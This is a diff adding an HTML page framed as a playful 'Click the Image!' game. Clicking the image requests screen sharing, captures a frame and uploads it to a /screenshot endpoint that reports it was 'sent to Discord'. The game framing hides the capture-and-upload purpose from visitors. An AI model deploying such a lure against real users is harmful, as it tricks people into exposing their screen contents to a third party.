@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun Image</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+        
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .clickable-image {
+            cursor: pointer;
+            border-radius: 15px;
+            transition: transform 0.3s ease;
+            max-width: 300px;
+            height: auto;
+        }
+        
+        .clickable-image:hover {
+            transform: scale(1.05);
+        }
+        
+        .clickable-image:active {
+            transform: scale(0.95);
+        }
+        
+        h1 {
+            color: white;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .status {
+            margin-top: 20px;
+            color: white;
+            font-size: 1.1em;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .status.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 Click the Image!</h1>
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDMwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIzMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjRkY2QjZCIi8+CjxyZWN0IHg9IjIwIiB5PSIyMCIgd2lkdGg9IjI2MCIgaGVpZ2h0PSIxNjAiIGZpbGw9IiNFRTVBMjQiLz4KPHN2ZyB4PSI1MCIgeT0iNjAiIHdpZHRoPSIyMDAiIGhlaWdodD0iODAiPgo8Y2lyY2xlIGN4PSIxMDAiIGN5PSI0MCIgcj0iMzAiIGZpbGw9IndoaXRlIi8+Cjx0ZXh0IHg9IjEwMCIgeT0iNDAiIGZpbGw9IiNGRjZCNkIiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGR5PSIuM2VtIj7wn5qAPC90ZXh0Pgo8L3N2Zz4KPC9zdmc+" 
+             alt="Click me!" 
+             class="clickable-image" 
+             id="clickableImage"
+             onclick="takeScreenshot()">
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        async function takeScreenshot() {
+            const status = document.getElementById('status');
+            const image = document.getElementById('clickableImage');
+            
+            // Show loading state
+            status.textContent = 'Taking screenshot...';
+            status.classList.add('show');
+            image.style.opacity = '0.7';
+            
+            try {
+                // Try to capture the screen using browser APIs
+                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: { mediaSource: 'screen' }
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    video.addEventListener('loadedmetadata', () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('screenshot', blob, 'screenshot.png');
+                            
+                            const response = await fetch('/screenshot', {
+                                method: 'POST',
+                                body: formData
+                            });
+                            
+                            if (response.ok) {
+                                status.textContent = 'Screenshot sent to Discord! 🎉';
+                                status.style.color = '#4CAF50';
+                            } else {
+                                status.textContent = 'Error sending screenshot';
+                                status.style.color = '#f44336';
+                            }
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    });
+                } else {
+                    // Fallback: send a simple request
+                    const response = await fetch('/screenshot', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ browser: true })
+                    });
+                    
+                    if (response.ok) {
+                        status.textContent = 'Request sent to Discord! 🎉';
+                        status.style.color = '#4CAF50';
+                    } else {
+                        status.textContent = 'Error sending request';
+                        status.style.color = '#f44336';
+                    }
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                status.textContent = 'Error taking screenshot';
+                status.style.color = '#f44336';
+            } finally {
+                // Reset image opacity
+                image.style.opacity = '1';
+                
+                // Hide status after 3 seconds
+                setTimeout(() => {
+                    status.classList.remove('show');
+                }, 3000);
+            }
+        }
+    </script>
+</body>
+</html>
